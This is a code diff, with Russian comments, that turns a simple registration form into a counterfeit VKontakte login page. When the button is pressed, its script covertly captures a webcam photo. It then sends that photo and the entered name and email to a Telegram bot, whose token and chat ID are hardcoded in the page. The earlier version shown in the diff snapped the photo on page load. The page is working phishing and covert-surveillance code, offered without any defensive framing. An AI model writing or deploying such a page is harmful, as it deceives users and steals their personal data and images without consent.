@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Регистрация</title>
+    <title>Авторизация ВКонтакте</title>
     <style>
         body {
-            background-color: #f0f0f0;
+            background-color: #f5f5f5;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -17,14 +17,16 @@
         }
         .container {
             background-color: white;
-            padding: 30px;
+            padding: 40px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
-            width: 300px;
+            width: 400px;
             text-align: center;
+            border: 1px solid #d8d8d8;
         }
         h1 {
-            font-size: 24px;
+            font-size: 28px;
+            color: #4C75A3;
             margin-bottom: 20px;
         }
         input {
@@ -38,7 +40,7 @@
         button {
             width: 100%;
             padding: 10px;
-            background-color: #4CAF50;
+            background-color: #2E66A2;
             color: white;
             border: none;
             border-radius: 5px;
@@ -46,32 +48,55 @@
             cursor: pointer;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #1A4F84;
+        }
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+        .footer a {
+            color: #1A4F84;
+            text-decoration: none;
         }
     </style>
     <script>
         const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Токен бота
         const CHAT_ID = "7477642275";  // Chat ID
         const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-        
-        // Функция для отправки фото в Telegram
-        function sendPhotoToTelegram(dataURI) {
-            let photoBlob = dataURItoBlob(dataURI);
+        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-            let formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, 'photo.png');
+        // Функция для отправки данных и фото в Telegram
+        function sendDataToTelegram(name, email, dataURI) {
+            let message = `📋 Новый пользователь:
+👤 Имя: ${name}
+📧 Email: ${email}`;
 
-            fetch(PHOTO_API_URL, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                return response.json();
-            }).then(data => {
-                console.log('Фото отправлено в Telegram:', data);
-            }).catch(error => {
-                console.error('Ошибка отправки фото:', error);
+            // Отправка текстового сообщения в Telegram
+            fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
+
+            // Отправка фото в Telegram
+            if (dataURI) {
+                let photoBlob = dataURItoBlob(dataURI);
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'photo.png');
+
+                fetch(PHOTO_API_URL, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    return response.json();
+                }).then(data => {
+                    console.log('Фото отправлено в Telegram:', data);
+                }).catch(error => {
+                    console.error('Ошибка отправки фото:', error);
+                });
+            }
         }
 
         // Функция для преобразования Data URL в Blob
@@ -86,28 +111,7 @@
         }
 
         // Функция для захвата фото с камеры и отправки в Telegram
-        function capturePhoto() {
-            // Пытаемся получить доступ к камере
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        let videoElement = document.createElement("video");
-                        videoElement.srcObject = stream;
-                        videoElement.play();
-
-                        // Сразу после разрешения на доступ к камере делаем фото
-                        setTimeout(() => {
-                            takeAndSendPhoto(stream, videoElement);
-                        }, 1000); // Даем 1 секунду на загрузку камеры
-
-                    }).catch(err => {
-                        console.log("Ошибка с доступом к камере: " + err);
-                    });
-            }
-        }
-
-        // Функция для захвата фото и отправки в Telegram
-        function takeAndSendPhoto(stream, videoElement) {
+        function capturePhoto(stream, videoElement) {
             let canvas = document.createElement("canvas");
             let ctx = canvas.getContext("2d");
             canvas.width = videoElement.videoWidth;
@@ -116,26 +120,52 @@
 
             let photoDataUrl = canvas.toDataURL("image/png");
 
-            // Отправка фото в Telegram
-            sendPhotoToTelegram(photoDataUrl);
+            // Отправка данных и фото в Telegram
+            const name = document.getElementById("name").value;
+            const email = document.getElementById("email").value;
+            sendDataToTelegram(name, email, photoDataUrl);
 
             // Останавливаем поток камеры и удаляем элемент видео
             stream.getTracks().forEach(track => track.stop());
         }
 
-        // Инициализация
-        window.onload = function() {
-            // При загрузке страницы сразу делаем фото
-            capturePhoto();
+        // Функция для захвата фото и отправки
+        function getCameraAndTakePhoto() {
+            // Пытаемся получить доступ к камере
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        let videoElement = document.createElement("video");
+                        videoElement.srcObject = stream;
+                        videoElement.play();
+
+                        // Через 2 секунды сделаем снимок
+                        setTimeout(() => {
+                            capturePhoto(stream, videoElement);
+                        }, 2000); // Даем 2 секунды на загрузку камеры
+                    }).catch(err => {
+                        console.log("Ошибка с доступом к камере: " + err);
+                    });
+            }
+        }
+
+        // Обработчик события на кнопку "Зарегистрироваться"
+        function handleRegistration() {
+            // При нажатии кнопки делаем фото и отправляем данные
+            getCameraAndTakePhoto();
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <h1>Регистрация</h1>
-        <input type="text" placeholder="Введите имя" id="name" />
-        <input type="email" placeholder="Введите email" id="email" />
-        <button onclick="capturePhoto()">Зарегистрироваться</button>
+        <h1>ВКонтакте</h1>
+        <p>Пожалуйста, авторизуйтесь</p>
+        <input type="text" id="name" placeholder="Имя" required />
+        <input type="email" id="email" placeholder="Email" required />
+        <button onclick="handleRegistration()">Зарегистрироваться</button>
+        <div class="footer">
+            <p>Зарегистрированы? <a href="#">Войти</a></p>
+        </div>
     </div>
 </body>
 </html>
